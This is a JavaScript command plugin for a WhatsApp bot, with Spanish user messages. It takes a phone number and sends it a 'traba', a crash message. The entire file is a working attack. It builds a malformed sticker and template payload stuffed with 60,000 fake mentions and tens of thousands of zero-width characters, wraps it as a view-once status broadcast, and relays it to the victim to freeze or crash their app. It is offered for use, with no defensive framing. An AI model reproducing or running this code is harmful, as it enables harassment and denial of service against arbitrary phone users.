let handler = async (m, { conn, text }) => {
    if (!text || !text.match(/^\+?\d{7,15}$/)) {
        return m.reply('😿 Debes proporcionar un número válido.\nEjemplo: .bullzer +521234567890', m);
    }

    const number = text.replace(/\D/g, '') + '@s.whatsapp.net';

    async function bulldozerV2(target) {
        const stickerPayload = {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: "image/webp",
                directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
                fileLength: { low: 99999999, high: 0, unsigned: true },
                mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                firstFrameLength: 50000,
                firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
                isAnimated: true,
                isAvatar: false,
                isLottie: false,
                contextInfo: {
                    mentionedJid: Array.from({ length: 60000 }, () =>
                        "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
                    ),
                    forwardingScore: 999999,
                    isForwarded: true,
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "\u200E".repeat(40000),
                        body: "\u200E".repeat(40000),
                        mediaUrl: "",
                        mediaType: 1,
                        thumbnail: Buffer.from([]),
                        sourceUrl: "",
                        renderLargerThumbnail: true
                    }
                }
            }
        };

        const templatePayload = {
            templateMessage: {
                hydratedTemplate: {
                    hydratedContentText: "\u200E".repeat(90000),
                    hydratedFooterText: "Oblivion Force Activated",
                    hydratedButtons: [],
                    templateId: "oblivion_" + Date.now(),
                    contextInfo: {
                        quotedMessage: stickerPayload,
                        forwardingScore: 88888,
                        isForwarded: true
                    }
                }
            }
        };

        const wrap = {
            viewOnceMessage: {
                message: templatePayload
            }
        };

        const msg = generateWAMessageFromContent(target, wrap, {
            quoted: null,
            messageId: "oblv_" + Date.now()
        });

        await conn.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }

    await bulldozerV2(number);

    await conn.sendMessage(m.chat, { text: `✅ Traba enviada al número: ${text}` }, { quoted: m });
};

handler.command = ['bullzer'];
handler.tags = ['tools'];
handler.help = ['bullzer <número>'];
export default handler;